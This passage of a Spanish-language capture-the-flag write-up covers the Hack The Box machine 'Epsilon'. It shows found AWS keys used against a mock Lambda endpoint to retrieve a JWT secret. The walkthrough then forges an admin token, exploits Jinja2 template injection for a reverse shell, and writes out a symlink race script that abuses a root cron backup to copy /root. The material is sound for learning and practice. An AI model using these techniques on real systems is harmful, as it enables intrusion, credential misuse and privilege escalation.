+</span></span></code></pre></div><p>Revisando el otro archivo recuperado, obtenemos el nombre del dominio utilizado para conectarse a aws lamda, el cual es <code>cloud.epsilon.htb</code>, por lo tanto agregamos este subdominio a nuestro archivo de hosts (<code>/etc/hosts</code>).</p><h2 id=aws-lambda>AWS Lambda</h2><p>Con las credenciales previamente encontradas, es posible acceder a la llave secreta utilizada en el JWT.</p><p>Lo primero a realizar es colocar las credenciales en nuestro awscli.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ aws configure
+</span></span><span style=display:flex><span>AWS Access Key ID <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>: AQLA5M37BDN6FJP76TDC
+</span></span><span style=display:flex><span>AWS Secret Access Key <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
+</span></span><span style=display:flex><span>Default region name <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>: us-east-1
+</span></span><span style=display:flex><span>Default output format <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>:                                 
+</span></span></code></pre></div><p>Revisando la página de ayuda de lambda contamos con distintas opciones, de las cuales nos interesa el listar funciones. Para ello la sintaxis es la siguiente: <code>aws lambda list-functions</code>, pero en este caso es necesario especificar el url del endpoint debido a que no vamos a conectarnos directamente a los servidores de aws sino a la máquina objetivo.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ aws lambda list-functions --endpoint-url <span style=color:#e6db74>&#34;http://cloud.epsilon.htb&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Functions&#34;</span>: <span style=color:#f92672>[</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;FunctionName&#34;</span>: <span style=color:#e6db74>&#34;costume_shop_v1&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;FunctionArn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Runtime&#34;</span>: <span style=color:#e6db74>&#34;python3.7&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Role&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::123456789012:role/service-role/dev&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Handler&#34;</span>: <span style=color:#e6db74>&#34;my-function.handler&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;CodeSize&#34;</span>: 478,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Description&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Timeout&#34;</span>: 3,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2022-09-15T04:27:49.044+0000&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;CodeSha256&#34;</span>: <span style=color:#e6db74>&#34;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Version&#34;</span>: <span style=color:#e6db74>&#34;</span>$LATEST<span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;VpcConfig&#34;</span>: <span style=color:#f92672>{}</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;TracingConfig&#34;</span>: <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;Mode&#34;</span>: <span style=color:#e6db74>&#34;PassThrough&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;RevisionId&#34;</span>: <span style=color:#e6db74>&#34;d342c387-f0a9-426b-8fc4-0881bd471b35&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;State&#34;</span>: <span style=color:#e6db74>&#34;Active&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;LastUpdateStatus&#34;</span>: <span style=color:#e6db74>&#34;Successful&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;PackageType&#34;</span>: <span style=color:#e6db74>&#34;Zip&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span></code></pre></div><p><em>Investigando un poco más sobre lambda sabemos que es posible obtener una reverse shell por medio de las funciones pero en este caso al ser un servicio customizado, no se incluye la opción para ejecutar las funciones, entonces seguimos por otra ruta.</em></p><p>Entre las opciones disponibles también es posible obtener el código fuente de la función, para eso usamos la opción <code>get-function</code>. En la respuesta obtenemos un enlace que nos permite descargar un archivo zip con el código fuente.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SHELL data-lang=SHELL><span style=display:flex><span>└─$ aws lambda get-function --function-name <span style=color:#e6db74>&#34;costume_shop_v1&#34;</span> --endpoint-url <span style=color:#e6db74>&#34;http://cloud.epsilon.htb&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Configuration&#34;</span>: <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;FunctionName&#34;</span>: <span style=color:#e6db74>&#34;costume_shop_v1&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;FunctionArn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Runtime&#34;</span>: <span style=color:#e6db74>&#34;python3.7&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Role&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::123456789012:role/service-role/dev&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Handler&#34;</span>: <span style=color:#e6db74>&#34;my-function.handler&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;CodeSize&#34;</span>: 478,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Description&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Timeout&#34;</span>: 3,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2022-09-15T04:27:49.044+0000&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;CodeSha256&#34;</span>: <span style=color:#e6db74>&#34;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Version&#34;</span>: <span style=color:#e6db74>&#34;</span>$LATEST<span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;VpcConfig&#34;</span>: <span style=color:#f92672>{}</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;TracingConfig&#34;</span>: <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Mode&#34;</span>: <span style=color:#e6db74>&#34;PassThrough&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;RevisionId&#34;</span>: <span style=color:#e6db74>&#34;d342c387-f0a9-426b-8fc4-0881bd471b35&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;State&#34;</span>: <span style=color:#e6db74>&#34;Active&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;LastUpdateStatus&#34;</span>: <span style=color:#e6db74>&#34;Successful&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;PackageType&#34;</span>: <span style=color:#e6db74>&#34;Zip&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Code&#34;</span>: <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Location&#34;</span>: <span style=color:#e6db74>&#34;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Tags&#34;</span>: <span style=color:#f92672>{}</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>└─$ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code -O lambda_archive.zip      
+</span></span><span style=display:flex><span>--2022-09-15 00:51:33--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code                         
+</span></span><span style=display:flex><span>Resolving cloud.epsilon.htb <span style=color:#f92672>(</span>cloud.epsilon.htb<span style=color:#f92672>)</span>... 10.10.11.134              
+</span></span><span style=display:flex><span>Connecting to cloud.epsilon.htb <span style=color:#f92672>(</span>cloud.epsilon.htb<span style=color:#f92672>)</span>|10.10.11.134|:80... connected.        
+</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span>                   
+</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>478</span> <span style=color:#f92672>[</span>application/zip<span style=color:#f92672>]</span>              
+</span></span><span style=display:flex><span>Saving to: ‘lambda_archive.zip’                                                                                                            
+</span></span><span style=display:flex><span>lambda_archive.zip                              100%<span style=color:#f92672>[====================================================================================================</span>&gt;<span style=color:#f92672>]</span>     <span style=color:#ae81ff>478</span>  --.-KB/s    in 0.1s         
+</span></span><span style=display:flex><span>2022-09-15 00:51:34 <span style=color:#f92672>(</span>4.88 KB/s<span style=color:#f92672>)</span> - ‘lambda_archive.zip’ saved <span style=color:#f92672>[</span>478/478<span style=color:#f92672>]</span> 
+</span></span><span style=display:flex><span>└─$ unzip lambda_archive.zip 
+</span></span><span style=display:flex><span>Archive:  lambda_archive.zip
+</span></span><span style=display:flex><span>  inflating: lambda_function.py  
+</span></span></code></pre></div><p>Al revisar el código fuente encontramos la llave secreta que necesitamos para poder crear nuestro jwt.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PYTHON data-lang=PYTHON><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>secret<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;RrXCv`mrNe!K!4+5`wYq&#39;</span> <span style=color:#75715e>#apigateway authorization for CR-124</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;Beta release for tracking&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>lambda_handler</span>(event, context):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        id<span style=color:#f92672>=</span>event[<span style=color:#e6db74>&#39;queryStringParameters&#39;</span>][<span style=color:#e6db74>&#39;order_id&#39;</span>]
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> id:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> {
+</span></span><span style=display:flex><span>               <span style=color:#e6db74>&#39;statusCode&#39;</span>: <span style=color:#ae81ff>200</span>,
+</span></span><span style=display:flex><span>               <span style=color:#e6db74>&#39;body&#39;</span>: json<span style=color:#f92672>.</span>dumps(str(resp)) <span style=color:#75715e>#dynamodb tracking for CR-342</span>
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> {
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;statusCode&#39;</span>: <span style=color:#ae81ff>500</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;body&#39;</span>: json<span style=color:#f92672>.</span>dumps(<span style=color:#e6db74>&#39;Invalid Order ID&#39;</span>)
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> {
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;statusCode&#39;</span>: <span style=color:#ae81ff>500</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;body&#39;</span>: json<span style=color:#f92672>.</span>dumps(<span style=color:#e6db74>&#39;Invalid Order ID&#39;</span>)
+</span></span><span style=display:flex><span>            }
+</span></span></code></pre></div><h2 id=server-side-template-injection>Server Side Template Injection</h2><p>Con la información recabada en los pasos anteriores es posible acceder a la página en el puerto 5000, para eso es necesario crear nuestro jwt y colocarlo en la cookie <code>auth</code>.
+<em>La biblioteca a descargar para el jwt es Pyjwt</em>
+Al observar el código fuente en el archivo <code>server.py</code>, vemos que para crear un token, utiliza el atributo username, la llave secreta y utiliza el algoritmo HS256. Entonces podemos crear nuestro token en la terminal interactiva de Python.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PYTHON data-lang=PYTHON><span style=display:flex><span><span style=color:#f92672>import</span> jwt
+</span></span><span style=display:flex><span>secret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;RrXCv`mrNe!K!4+5`wYq&#39;</span>
+</span></span><span style=display:flex><span>jwt<span style=color:#f92672>.</span>encode({<span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;admin&#34;</span>},secret,algorithm<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;HS256&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e># jwt: &#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg&#39;</span>
+</span></span></code></pre></div><p>Colocamos nuestra cookie y listo tenemos acceso a la página.
+<img src=/images/epsilon/auth.png alt="Login Bypass">
+Sabemos que existe un SSTI en la ruta <code>/order</code>, dirigiendonos a la ruta, vemos que la vulnerabilidad es por medio del parámetro <code>costume</code>, el cual es una lista desplegable, para poder ingresar el input que deseamos interceptamos la solicitud por medio de burp y tenemos acceso a la modificación del parámetro, al tratarse de un servidor en Flask sabemos que utiliza Jinja2 para renderizar los template, por lo que, es posible obtener un RCE.
+<img src=/images/epsilon/ssti.png alt="Jinja2 - RCE">
+Con lo anterior se tiene acceso a la máquina utilizando una reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SHELL data-lang=SHELL><span style=display:flex><span>└─$ nc -lvnp <span style=color:#ae81ff>1234</span>          
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1234</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.16.4<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.11.134<span style=color:#f92672>]</span> <span style=color:#ae81ff>45710</span>
+</span></span><span style=display:flex><span>tom@epsilon:/var/www/app$ id
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>tom<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>tom<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>tom<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>tom@epsilon:/var/www/app$ 
+</span></span></code></pre></div><h1 id=escalación-de-privilegios>Escalación de Privilegios</h1><p>Al revisar los procesos que se estan ejecutando observamos que hay un cron perteneciente a root.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SHELL data-lang=SHELL><span style=display:flex><span>tom@epsilon:/var/www/app$ ps -aux
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>744</span>  0.0  0.2 <span style=color:#ae81ff>392412</span> <span style=color:#ae81ff>11996</span> ?        Ssl  04:27   0:00 /usr/lib/udisks2/udisksd
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>861</span>  0.0  0.1 <span style=color:#ae81ff>232716</span>  <span style=color:#ae81ff>6808</span> ?        Ssl  04:27   0:00 /usr/lib/policykit-1/polkitd --no-debug
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>913</span>  0.0  0.0   <span style=color:#ae81ff>6812</span>  <span style=color:#ae81ff>3044</span> ?        Ss   04:27   0:00 /usr/sbin/cron -f
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>921</span>  0.1  1.2 <span style=color:#ae81ff>975768</span> <span style=color:#ae81ff>50368</span> ?        Ssl  04:27   0:06 /usr/bin/containerd
+</span></span><span style=display:flex><span>daemon       <span style=color:#ae81ff>923</span>  0.0  0.0   <span style=color:#ae81ff>3792</span>  <span style=color:#ae81ff>2436</span> ?        Ss   04:27   0:00 /usr/sbin/atd -f
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>941</span>  0.0  0.0   <span style=color:#ae81ff>8352</span>  <span style=color:#ae81ff>3436</span> ?        S    04:27   0:00 /usr/sbin/CRON -f
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>947</span>  0.0  0.0   <span style=color:#ae81ff>5828</span>  <span style=color:#ae81ff>1864</span> tty1     Ss+  04:27   0:00 /sbin/agetty -o -p -- <span style=color:#ae81ff>\u</span> --noclear tty1 linux
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>960</span>  0.0  0.0   <span style=color:#ae81ff>2608</span>   <span style=color:#ae81ff>612</span> ?        Ss   04:27   0:00 /bin/sh -c cd /var/www/app;sudo -u tom python3 app.py
+</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>966</span>  0.0  0.1   <span style=color:#ae81ff>9420</span>  <span style=color:#ae81ff>4580</span> ?        S    04:27   0:00 sudo -u tom python3 app.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>Entonces podemos utilizar <code>pspy</code> para poder ver los procesos conforme se van ejecutando, vemos que se ejecuta el archivo <code>/usr/bin/backup.sh</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SHELL data-lang=SHELL><span style=display:flex><span>2022/09/11 20:12:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5515</span>   | /bin/bash /usr/bin/backup.sh 
+</span></span><span style=display:flex><span>2022/09/11 20:12:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5515</span>   | /bin/sh -c /usr/bin/backup.sh 
+</span></span><span style=display:flex><span>2022/09/11 20:12:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5517</span>   | 
+</span></span><span style=display:flex><span>2022/09/11 20:12:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5519</span>   | /usr/bin/tar -cvf /opt/backups/700198870.tar /var/www/app/ 
+</span></span><span style=display:flex><span>2022/09/11 20:12:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5521</span>   | /bin/bash /usr/bin/backup.sh 
+</span></span><span style=display:flex><span>2022/09/11 20:12:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5520</span>   | sha1sum /opt/backups/700198870.tar 
+</span></span><span style=display:flex><span>2022/09/11 20:12:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5522</span>   | sleep <span style=color:#ae81ff>5</span> 
+</span></span><span style=display:flex><span>2022/09/11 20:12:06 CMD: UID<span style=color:#f92672>=</span>???  PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5523</span>   | ???
+</span></span><span style=display:flex><span>2022/09/11 20:12:06 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>5524</span>   | /usr/bin/tar -chvf /var/backups/web_backups/710549490.tar /opt/backups/checksum /opt/backups/700198870.tar 
+</span></span></code></pre></div><p>Al revisar el archivo tenemos permisos de lectura. Entonces sabemos lo que hace:</p><ul><li>Borra los archivos del directorio <code>/opt/backups/</code></li><li>Comprime el directorio <code>/var/www/app</code> con tar y el archivo lo guarda en el directorio <code>opt/backups/</code></li><li>Obtiene el checksum del archivo y lo guarda en <code>/opt/backups/checksum</code></li><li>Comprime en un archivo tar los dos archivos creados anteriormente y lo guarda en el directorio <code>/var/backups/web_backups/</code></li><li>Borra los archivos del directorio <code>/opt/backups/</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>file<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>date +%N<span style=color:#e6db74>`</span>
+</span></span><span style=display:flex><span>/usr/bin/rm -rf /opt/backups/*
+</span></span><span style=display:flex><span>/usr/bin/tar -cvf <span style=color:#e6db74>&#34;/opt/backups/</span>$file<span style=color:#e6db74>.tar&#34;</span> /var/www/app/
+</span></span><span style=display:flex><span>sha1sum <span style=color:#e6db74>&#34;/opt/backups/</span>$file<span style=color:#e6db74>.tar&#34;</span> | cut -d <span style=color:#e6db74>&#39; &#39;</span> -f1 &gt; /opt/backups/checksum
+</span></span><span style=display:flex><span>sleep <span style=color:#ae81ff>5</span>
+</span></span><span style=display:flex><span>check_file<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>date +%N<span style=color:#e6db74>`</span>
+</span></span><span style=display:flex><span>/usr/bin/tar -chvf <span style=color:#e6db74>&#34;/var/backups/web_backups/</span><span style=color:#e6db74>${</span>check_file<span style=color:#e6db74>}</span><span style=color:#e6db74>.tar&#34;</span> /opt/backups/checksum <span style=color:#e6db74>&#34;/opt/backups/</span>$file<span style=color:#e6db74>.tar&#34;</span>
+</span></span><span style=display:flex><span>/usr/bin/rm -rf /opt/backups/*
+</span></span></code></pre></div><p>Del contenido lo más destacado es la opción -c<code>h</code>vf utilizada en el segundo tar. Esta opción lo que hace es incluir los archivos a los que apunta un enlace simbólico, con esto es posible obtener los archivos del directorio <code>/root</code>.</p><p>Como tenemos permisos de escritura en el directorio <code>/opt/backups/</code>, podemos reemplazar un archivo de los que se comprimen en el segundo tar, por un enlace simbólico que apunte al directorio <code>/root</code>. Es posible realizarlo maunalmente esperando a que se creen los archivos, pero en esta ocasión es mejor realizar un script que este esperando la existencia del archivo <code>/opt/backups/checksum</code>, una vez detectado el archivo lo elimina y procede a realizar un enlace simbólico hacia el directorio <code>/root</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>flag<span style=color:#f92672>=</span>true
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Waiting cron&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> $flag; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> -e <span style=color:#e6db74>&#34;/opt/backups/checksum&#34;</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;[+] The file exists&#34;</span>
+</span></span><span style=display:flex><span>                rm -f /opt/backups/checksum
+</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;[+] File deleted&#34;</span>
+</span></span><span style=display:flex><span>                ln -s /root /opt/backups/checksum
+</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;[+] Symlink created&#34;</span>
+</span></span><span style=display:flex><span>                flag<span style=color:#f92672>=</span>false
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>Después de ejecutar el script observamos un tar de mayor tamaño que los anteriores.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SHELL data-lang=SHELL><span style=display:flex><span>tom@epsilon:/tmp$ ls -la /var/backups/web_backups/               
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>80420</span>                    
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> root root     <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>15</span> 06:07 .                         
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>3</span> root root     <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>15</span> 04:58 ..                          
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>1003520</span> Sep <span style=color:#ae81ff>15</span> 06:05 323888649.tar               
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>1003520</span> Sep <span style=color:#ae81ff>15</span> 06:06 343435605.tar  
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>80332800</span> Sep <span style=color:#ae81ff>15</span> 06:07 437418946.tar  
+</span></span></code></pre></div><p>Ya solo es cuestión de descomprimir el archivo tar para obtener los contenidos, donde encontramos credenciales para conectarnos por medio de ssh y la flag de root para completar la máquina.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SHELL data-lang=SHELL><span style=display:flex><span>tom@epsilon:/tmp$ tar -xf 437418946.tar           
+</span></span><span style=display:flex><span>tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted                
+</span></span><span style=display:flex><span>tar: Exiting with failure status due to previous errors
+</span></span><span style=display:flex><span>tom@epsilon:/tmp/opt/backups/checksum$ ls -la
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>60</span>
+</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>9</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> .
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>3</span> tom tom <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>15</span> 06:08 ..
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> .aws
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> tom tom <span style=color:#ae81ff>3106</span> Dec  <span style=color:#ae81ff>5</span>  <span style=color:#ae81ff>2019</span> .bashrc
+</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>4</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> .cache
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>3</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> .config
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> tom tom  <span style=color:#ae81ff>356</span> Nov <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2021</span> docker-compose.yml
